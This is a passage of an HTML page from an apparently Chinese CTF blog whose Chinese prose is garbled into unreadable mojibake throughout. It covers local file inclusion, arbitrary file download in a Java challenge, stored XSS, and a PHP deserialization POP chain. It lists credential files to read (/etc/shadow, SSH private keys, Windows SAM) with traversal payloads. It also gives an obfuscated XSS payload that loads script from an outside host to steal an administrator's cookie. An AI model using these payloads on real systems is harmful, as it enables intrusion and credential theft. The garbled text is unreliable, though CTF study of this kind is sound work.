</li><li>C:\Windows\repair\sam //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç 
</li><li>C:\Program Files\mysql\my.ini //Mysqlé…ç½®
</li><li>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
</li><li>C:\Windows\php.ini //phpé…ç½®ä¿¡æ¯
</li><li>C:\Windows\my.ini //Mysqlé…ç½®ä¿¡æ¯
</li><li>C:\Windows\win.ini //Windowsç³»ç»Ÿçš„ä¸€ä¸ªåŸºæœ¬ç³»ç»Ÿé…ç½®æ–‡ä»¶
</li></ol>

<p>linux:</p>
<ol>
<li>root/.ssh/authorized_keyså¦‚éœ€ç™»å½•åˆ°è¿œç¨‹ä¸»æœºï¼Œéœ€è¦åˆ°.sshç›®å½•ä¸‹ï¼Œæ–°å»ºauthorized_keysæ–‡ä»¶ï¼Œå¹¶å°†id_rsa.pubå†…å®¹å¤åˆ¶è¿›å»
</li><li>/root/.ssh/id_rsa//sshç§é’¥,sshå…¬é’¥æ˜¯id_rsa.pub
</li><li>/root/.ssh/id_ras.keystore//è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥
</li><li>/root/.ssh/known_hosts //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥
</li><li>/etc/passwd
</li><li>/etc/shadow//è´¦æˆ·å¯†ç æ–‡ä»¶
</li><li>/etc/my.cnf //mysqlé…ç½®æ–‡ä»¶
</li><li>/etc/httpd/conf/httpd.conf //apacheé…ç½®æ–‡ä»¶
</li><li>/root/.bash_history //ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶
</li><li>/root/.mysql_history //mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶
</li><li>/proc/mounts //è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡
</li><li>/porc/config.gz //å†…æ ¸é…ç½®æ–‡ä»¶
</li><li>/var/lib/mlocate/mlocate.db //å…¨æ–‡ä»¶è·¯å¾„
</li><li>/porc/self/cmdline //å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•°
</li></ol>

<p><b style="color:pink">æ¼æ´éªŒè¯</b><br>xxx.php?f=../../../../../../etc/passwd<br>xxx.php?f=../index.php<br>xxx.php?f=ï¬le:///etc/passwd</p>
<p>å‚æ•°fçš„å‚æ•°å€¼ä¸ºPHPæ–‡ä»¶æ—¶ï¼š<br>  1.ä»¶è¢«è§£æï¼Œåˆ™æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´<br>  2.æ˜¾ç¤ºæºä»£ç ï¼Œåˆ™æ˜¯æ–‡ä»¶æŸ¥çœ‹æ¼æ´<br>  3.æç¤ºä¸‹è½½ï¼Œåˆ™æ˜¯æ–‡ä»¶ä¸‹è½½æ¼æ´</p>
<p>æœ€åé™„ä¸Šå¤§ä½¬æ€»ç»“çš„èµ„æºï¼š<a target="_blank" rel="noopener" href="https://github.com/tutorial0/payloads/blob/master/lfi.txt">æ˜¯å„ç§æ–‡ä»¶è·¯å¾„é¸­</a></p>
<h2>[RoarCTF 2019]Easy Java 1</h2>

<p>emmè¿™é“é¢˜æˆ‘ç›´æ¥æƒ³åˆ°çš„å°±æ˜¯sqlæ³¨å…¥è¯•äº†åŠå¤©æ²¡æœ‰ç»“æœï¼Œä½œä¸ºwebé€‰æ‰‹çš„æˆ‘ç•™ä¸‹äº†ä¸æ‡‚ctfçš„æ³ª<br>ç›´æ¥çœ‹é¢˜ç›®ï¼š<br><img src="/2021/04/01/b/1.png"><br>è¿™æ ·è‰²å„¿çš„<br>ä¸€é¡¿æ“ä½œçŒ›å¦‚è™admin admin888<br><img src="/2021/04/01/b/2.png"><br>euuuuæˆ‘å¼€å§‹è¿˜è§‰å¾—è¿™ä¸ªå›¾ç‰‡æœ‰çŒ«è…»ï¼Œæ˜¯æˆ‘æƒ³å¤šäº†=|=<br>åˆçªç„¶å‘ç°ä¸‹æ–¹é‚£å°å°çš„helpï¼Œç‚¹å‡»å¦‚ä¸‹ï¼š<br><img src="/2021/04/01/b/3.png"><br>java fliename éš¾é“javaä¹Ÿæœ‰ä¼ªåè®®ï¼Ÿç™¾åº¦æœç´¢å¹¶æ²¡æœ‰<br>å·ç„ä¸€ä¸‹åˆ«äººwpï¼ŒåŸæ¥æ˜¯javaä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚<br><code>url/Download?filename=WEB-INF/web.xml</code><br><code>POST:filename=WEB-INF/web.xml</code><br><img src="/2021/04/01/b/4.png"><br>è¿˜è¦è¦postä¼ å‚ï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œå°±å¾ˆå‰å®³ï¼ˆgouï¼‰<br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬æ—§çš„åˆ°äº†ä¸€ä¸ªæ–‡ä»¶æ‰“å¼€åæ˜¯è¿™æ ·è‰²å„¿çš„ï¼š<br><img src="/2021/04/01/b/5.png"><br>æœ‰ç–‘ä¼¼flagçš„è·¯å¾„ï¼Œæˆ‘ä»¬æ¥è®¿é—®ä¸‹ï¼Œè¦åœ¨è·¯å¾„å‰é¢åŠ ä¸Šclasses<br><code>url/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code><br><code>POST:filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code><br>é€šè¿‡è®°äº‹æœ¬çš„æ–¹å¼å¤§å¼€<br><img src="/2021/04/01/b/6.png"><br>é‡Œé¢æœ‰æ®µbase64ç¼–ç ï¼šZmxhZ3s1ZjY5MjkxMi0yN2Q0LTRhN2EtYjdlMC04MjAyMTdlYzA2NjR9Cg==<br>è§£å¯†åä¾¿æ˜¯flag</p>
</h2></h2>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-xxs" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/03/31/xxs/" class="article-date">
      <time datetime="2021-03-31T12:14:19.000Z" itemprop="datePublished">2021-03-31</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/03/31/xxs/">ctf xssåˆ©ç”¨_xssæ€»ç»“</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1>[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2</h1>
<h2>é¢˜ç›®</h2>

<p><img src="/2021/03/31/xxs/1.png"><br>é¢˜ç›®æœ‰ä¸¤ä¸ªçª—å£ï¼Œåæ§½å’Œç™»å½•<br>æ²¡æœ‰æ³¨å†Œç•Œé¢ï¼Œç›´æ¥åæ§½å­</p>
<h2>é¢˜è§£</h2>

<p>å°è¯•å¼¹çª—<code>&lt;script&gt;alert(1)&lt;/script&gt</code><br>emmmå¹¶æ²¡æœ‰ä»»ä½•ä¸œè¥¿è·³å‡ºæ¥ï¼Œé‚£æˆ‘ä»¬æ¢ä¸€ä¸ªhtmlæ ‡ç­¾è¯•è¯•ï¼š<code>&lt;IMG SRC=&quot;javascript.:alert(&#039;XSS&#039;);&quot;&gt</code><br><img src="/2021/03/31/xxs/2.png"><br>æœ‰ä¸ªä¸ä¸ºäººçŸ¥çš„å›¾ç‰‡ï¼Œçœ‹æ¥æ˜¯å­˜åœ¨xxsæ¼æ´äº†<br>åæ§½é¡µé¢æ˜¯ç”¨æ¥æ”¾XSSçš„ï¼Œç„¶ååœ¨åé¦ˆç»™ç®¡ç†å‘˜è¿™æ ·æˆ‘ä»¬å°±èƒ½æ‹¿åˆ°ç®¡ç†å‘˜çš„cookieï¼Œå› ä¸ºè¿™é‡Œæ˜¯å†…ç½‘ç¯å¢ƒï¼Œæ‰€ä»¥åªèƒ½å» <a target="_blank" rel="noopener" href="http://xss.buuoj.cn/index.php?do=login">http://xss.buuoj.cn/index.php?do=login</a> æ³¨å†Œè´¦å·æ¥æ¥æ”¶cookieã€‚</p>
<pre>&lt;/textarea&gt;'"&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxss.buuoj.cn%2F8sVXk7%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;
</pre>
<p>ä»£ç å†™åœ¨åæ§½ä¸Šæäº¤ï¼Œè®¿é—®ï¼Œåœ¨xxså¹³å°ä¸Šå°±å¯ä»¥çœ‹åˆ°cookieå’Œè®¿é—®é“¾æ¥ï¼š<br><img src="/2021/03/31/xxs/3.png"><br>åˆ©ç”¨ç®¡ç†å‘˜çš„cookieï¼Œä»¥åŠæ¥è®¿åœ°å€â€¦node3.buuoj.cn/backend/admin.phpç™»å½•å³å¯å¾—åˆ°flagï¼ˆç”¨chromeçš„edit this cookieæ’ä»¶æ¯”è¾ƒæ–¹ä¾¿ï¼‰<br><img src="/2021/03/31/xxs/4.png"></p>
<h1>çŸ¥è¯†ç‚¹</h1>
<h2>0x01xssä½œç”¨</h2>

<p>emmå®Œå…¨ä¸çŸ¥é“xxsæ˜¯ä»€ä¹ˆçš„æˆ‘çœ‹äº†èµµå¤§ä½¬çš„è®²åº§ï¼Œé™„ä¸Šå­¦ä¹ é“¾æ¥ï¼Œè®°å¾—ç™½å«–ï¼š<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1XE411f7qT?from=search&seid=6094814016757224378">æˆ‘çˆ±å­¦ä¹ ~~</a><br>å¸¸è§çš„è¾“å‡ºå‡½æ•°ï¼šprint()ã€ print_r()ã€ echoã€ printf()ã€ sprintf()ã€ die()ã€ var_dump()ã€ var_export()<br>xssæ˜¯å¾€é¡µé¢ä¸­æ·»åŠ äº†ä¸€æ®µä»£ç ï¼Œå¹¶ä¸”è¢«æµè§ˆå™¨æ‰§è¡Œäº†<br>åå°„å‹å°†æ¶æ„ä»£ç å†™å…¥å‚æ•°ï¼Œæˆ–è€…è‡ªå·±æœåŠ¡å™¨ä¸Šæ­ä¸ªformè¡¨å•ä¼ é€ï¼Œç”¨æ¥é’“é±¼<br>å­˜å‚¨å‹å°±ç­‰ç€åˆ«äººç‚¹è¿™ä¸ªç½‘é¡µå°±è¡Œäº†</p>
<h2>0x02æ‰‹æ®µ</h2>

<p>xssä¸»è¦å‡ºç°çš„åœ°æ–¹ï¼šæ–‡ç« å‘è¡¨ï¼Œè¯„è®ºå›å¤ï¼Œç•™è¨€ï¼Œèµ„æ–™è®¾ç½®ç­‰<br>xssæ— éå°±æ˜¯è¦å¯¹æ–¹çš„cookieï¼Œä½†æ˜¯å¸¸å¸¸ä¼šæœ‰httponlyå¯¼è‡´cookieå¹¶ä¸èƒ½ä¼ åˆ°xsså¹³å°ï¼Œè¿™æ˜¯ä¸€ç§æœ‰æ•ˆçš„é˜²å¾¡æ–¹å¼<br>ä½†æ˜¯xssé¢„é˜²åº”è¯¥ä»æœ¬è´¨å‡ºå‘ï¼Œå³å¯¹è¯¥é¡µé¢ç”¨æˆ·è¾“å…¥ä¸èƒ½è¢«æ‰§è¡Œ<br>xssè§¦å‘æ–¹æ³•<br>åˆ©ç”¨scriptæ ‡ç­¾æ‰§è¡Œjs<br>å­—ç¬¦ä¸²ç”¨â€ â€˜ åŒ…è£¹éƒ½è¡Œ<br>é‡‡ç”¨onäº‹ä»¶æ–¹æ³•<br>onäº‹ä»¶ä¸ç”¨å•å¼•å·æˆ–åŒå¼•å·ä¹Ÿå¯ä»¥è§¦å‘ï¼Œä½†æ˜¯å¿…é¡»é—­åˆæ ‡ç­¾å†…çš„å¼•å·<br>=&gt;ç‚¹å‡»å°±ä¼šè§¦å‘ =&gt;é¼ æ ‡ç§»åŠ¨è§¦å‘<br>èƒ½å¤Ÿä½¿ç”¨onäº‹ä»¶çš„æ ‡ç­¾<br>æ”¯æŒon clickäº‹ä»¶çš„æ ‡ç­¾æœ‰</p>
<ul>
<li>, , , , ,
</li><li>, , ,
</li><li>, , , , ,
</li><li>, , , , ,,
</li><li>to
</li><li>, , , , , ,
</li></ul>

<p>é‡‡ç”¨aæ ‡ç­¾æ¥åšåˆ°xss</p>
<h2>0x03bypassæ–¹æ³•</h2>

<p>é‡‡ç”¨ç¼–ç ï¼ŒæŠŠå­—ç¬¦ä¸²å¯ä»¥è¿›è¡Œç¼–ç <br>åæ¥åè¿›åˆ¶ =&gt; unicodeç¼–ç <br>â€‹ åæ¥åå…­è¿›åˆ¶ =&gt; unicodeç¼–ç <br>é‡‡ç”¨æ ‡ç­¾ä¸­çš„ç©ºéš™è§„åˆ™<br>å‡è®¾æ­£åˆ™æ˜¯<br>]*)&gt;([\s\S][^<br>å¯ä»¥é‡‡ç”¨<br>==&gt; æœ€åæœ‰ä¸ªpå’Œ&gt;é—´æœ‰ç©ºæ ¼ç»•è¿‡<br>é‡‡ç”¨åŒå†™ç»•è¿‡ç©ºå­—ç¬¦æ›¿æ¢<br>å¦‚æœè¢«åˆ é™¤å…³é”®å­—ï¼Œå¯ä»¥é‡‡ç”¨é‡å†™æ–¹æ³•æ¯”å¦‚<br>ç”¨å¤§å°å†™ç»•è¿‡ä¸ä¸¥æ ¼çš„waf<br>é‡‡ç”¨å‚æ•°è¦†ç›–ï¼Œè¦†ç›–æ‰hiddenå‚æ•°<br>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¸ºï¼šâ€ onmouseover=alert(1) type=â€text<br>æœ‰äº›æ ‡ç­¾çš„ä¼˜å…ˆçº§é«˜äºâ€,å¯¼è‡´æ‰§è¡Œxss</p>
<p>æœ€åä¸æ˜ç™½é‚£æ®µä»£ç æ˜¯ä¸ªä»€ä¹ˆæ„æ€ï¼Œxxsä¹Ÿæ²¡æ”¹æ˜ç™½ï¼Œåœ¨æ…¢æ…¢ç ”ç©¶å§ï¼</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-pop" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/03/30/pop/" class="article-date">
      <time datetime="2021-03-30T09:02:06.000Z" itemprop="datePublished">2021-03-30</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/03/30/pop/">popé“¾-&gt;[MRCTF2020]ezpop</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>æ‰“å¼€é¢˜ç›®ï¼Œç»™å‡ºå¦‚ä¸‹ä»£ç :</p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//flag is in flag.php</span>
<span class="token comment">//WTF IS THIS?</span>
<span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>
<span class="token comment">//And Crack It!</span>
<span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">&#61;</span><span class="token single-quoted-string string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token single-quoted-string string">&#39;Welcome to &#39;</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&#34;&lt;br&gt;&#34;</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
            <span class="token keyword">echo</span> <span class="token double-quoted-string string">&#34;hacker&#34;</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token double-quoted-string string">&#34;index.php&#34;</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">&#61;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$function</span> <span class="token operator">&#61;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;pop&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
    &#64;<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;pop&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token variable">$a</span><span class="token operator">&#61;</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> 
</code></pre> 
<p><code>ååºåˆ—åŒ–popé“¾é­”æ³•å‡½æ•°</code>ï¼Œé­”æ³•å‡½æ•°æ–¹æ³•åœ¨å‰é¢æœ‰æ€»ç»“</p>
<ol>
<li>é¢˜ç›®é€šè¿‡getä¼ å…¥å‚æ•°popï¼Œä¼šè‡ªåŠ¨è°ƒåŠ¨Showä¸­çš„<code>_wake up()</code>
</li><li>_wake up()é€šè¿‡è¿‡æ»¤å¯¹<code>$this->source</code>åšå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå¦‚æœ$this->sourceæ˜¯Showç±»ï¼Œå°±è°ƒç”¨äº†__toString()
</li><li>å¦‚æœ__toString()å…¶ä¸­strèµ‹å€¼ä¸ºä¸€ä¸ªå®ä¾‹åŒ–çš„Testç±»ï¼Œé‚£ä¹ˆå…¶ç±»ä¸å«æœ‰sourceå±æ€§ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨Testä¸­çš„_get()æ–¹æ³•ã€‚
</li><li>å¦‚æœ_get()ä¸­çš„pèµ‹å€¼ä¸ºModifierç±»ï¼Œé‚£ä¹ˆç›¸å½“äºModifierç±»è¢«å½“ä½œå‡½æ•°å¤„ç†ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨Modifierç±»ä¸­çš„_invoke()æ–¹æ³•ã€‚
</li><li>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½¿ç”¨_invoke()è¯»å–flag.phpçš„å†…å®¹ã€‚
</li></ol>

<p><b>ååºåˆ—åŒ–æ„é€ popé“¾çš„é¢˜ç›®è¦æ³¨æ„ä¸¤ä¸ªç‚¹</b><br><code>1.å…¥å£ç‚¹ï¼Œååºåˆ—åŒ–POPé“¾æ„é€ çš„å…¥å£</code><br><code>2.æ‰¾å±é™©å‡½æ•°ï¼Œå¦‚æœå«æœ‰æŸäº›å±é™©å‡½æ•°å°±å¯èƒ½å¯¼è‡´æ¼æ´è¾¾åˆ°ç›®çš„</code><br>å…³äºå…¥å£ç‚¹è¦ä¹‹ä¸€ä¸€äº›é­”æœ¯æ–¹æ³•ï¼šå¦‚<code>__construct ã€__desstructã€__wakeup</code>ç­‰ç­‰<br>è§‚å¯Ÿä»£ç ï¼Œå‘ç°æœ‰ä¸€ä¸ªå‡½æ•°<code>include()</code>çš„å†…å®¹å¯æ§ï¼Œè¿™é‡Œå°±å¯èƒ½é€ æˆæ–‡ä»¶åŒ…å«æ¼æ´<br>è€Œååºåˆ—åŒ–çš„å…¥å£ç‚¹åœ¨Showç±»ä¸­</p>
<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">&#61;</span><span class="token single-quoted-string string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token single-quoted-string string">&#39;Welcome to &#39;</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&#34;&lt;br&gt;&#34;</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span>
            <span class="token keyword">echo</span> <span class="token double-quoted-string string">&#34;hacker&#34;</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token double-quoted-string string">&#34;index.php&#34;</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</code></pre> 

<p>ä½¿ç”¨unserializeæ—¶è§¦å‘<code>__wakeup()</code>ï¼Œå¯¹$this-&gt;sourceæ­£åˆ™åŒ¹é…è¿‡æ»¤å…³é”®å­—ï¼Œå¦‚æœ$this-&gt;sourceæ­¤æ—¶æ˜¯ä¸€ä¸ªç±»çš„è¯ï¼Œæ­¤æ—¶ç±»å°±è¢«å½“æˆäº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œå°±ä¼šè§¦å‘<code>__tostring</code></p>
<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">&#61;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$function</span> <span class="token operator">&#61;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</code></pre> 

<p>Testç±»ä¸­çš„<code>__get()ï¼Œ__toString()</code>è®¿é—®äº†strçš„sourceå±æ€§ï¼Œstræ˜¯Testç±»ï¼Œä¸å­˜åœ¨sourceå±æ€§ï¼Œå°±ä¼šè°ƒç”¨Textä¸­çš„<code>__get()</code></p>
<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
</code></pre> 

